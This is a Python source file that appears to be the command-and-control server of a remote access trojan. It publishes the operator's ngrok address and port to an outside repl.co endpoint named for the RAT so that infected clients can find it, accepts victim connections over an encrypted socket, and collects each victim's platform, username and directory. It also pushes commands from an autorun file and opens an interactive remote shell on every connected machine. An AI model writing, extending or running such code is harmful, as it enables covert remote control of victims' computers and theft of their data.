from random import choice
import socket, os, threading, json
from cryptography.fernet import Fernet
import requests
import updater

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890!@#$%^&*()"

#read the key or generate
key = b""
if os.path.exists("client.key"):
    with open("client.key", "rb") as f:
        key = f.read()
else:
    with open("client.key", "wb") as f:
        key = Fernet.generate_key()
        f.write(key)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

port = 34467
host = "0.0.0.0"

requests.get("https://rat-app-yay.ryderretzlaff.repl.co/set_ip/?ip=" + socket.gethostbyname(input("Please enter ngrok url: ")))
requests.get("https://rat-app-yay.ryderretzlaff.repl.co/set_port/?port=" + input("Port: "))

s.bind((host, port))
print(f"LISTENING ON {host}:{port}")

s.listen(100)

def new_salt():
    salt = ""
    for x in range(15):
        salt += choice(chars)
    return salt

def handle_client(conn, addr):
    encryption = False
    def send_raw(content_type, Bytes_, salt=new_salt()):
        seperator = "<|SEPERATE|>"
        to_send = content_type + seperator + Bytes_.decode() + seperator + salt
        to_send = to_send.encode()
        if encryption:
            to_send = Fernet(key).encrypt(to_send)
        conn.send(to_send)
    
    def recv_raw(BufferSize):
        seperator = "<|SEPERATE|>".encode()
        data = b""
        while True:
            data = conn.recv(BufferSize)
            if data: break
        if encryption:
            data = Fernet(key).decrypt(data)
        splitted = data.decode().split(seperator.decode())
        content_type = splitted[0]
        Bytes_ = splitted[1].encode()
        salt = splitted[2]
        return {"content_type": content_type, "bytes": Bytes_}

    print("NEW CLIENT AT IP: " + str(addr[0]))
    print("EXTANGING KEY")
    send_raw("KEY", key)
    client_key = recv_raw(1024)["bytes"]
    if key == client_key:
        print("KEY EXTANGE VERIFIED")
    else:
        print("UNABLE TO VERIFY, CLIENT MAY EXPERIENCE ISSUES")
        print(key)
        print(client_key)
    encryption = True

    print("GRAPPING SYSTEM INFO...")
    sys_info_request = recv_raw(1024)
    print("RECIVED, DECODING...")
    sys_info = json.loads(sys_info_request["bytes"].decode())
    print("BASIC INFO:")
    print("Platoform: " + sys_info["platform"])
    print("Architecture: " + str(sys_info["architecture"]))
    print("Username: " + sys_info["username"])
    
    if os.path.exists("autorun.txt"):
        with open("autorun.txt", "r") as f:
            print("FOUND AUTORUN, EXECUTING COMMANDS")
            for line in f.readlines():
                print("> " + line)
                send_raw("command", line.encode())
                output = recv_raw(1024)
                print(output["bytes"].decode())

    current_dir = sys_info["current_dir"]
    while True:
        try:
            cmd = input(current_dir + "> " + sys_info["username"] + " $ ")
            if cmd == "abort":
                send_raw("abort", "".encode())
                conn.close()
                print("SAFE")
                break
            def handle_cmd():
                send_raw("command", cmd.encode())
                output = recv_raw(1024)["bytes"].decode()
                print(output)
            
            threading.Thread(target=handle_cmd).start()

        except:
           print("UNEXCPECTED ERROR")

while True:
    conn, addr = s.accept()
    threading.Thread(target=handle_client, args=(conn,addr,)).start()
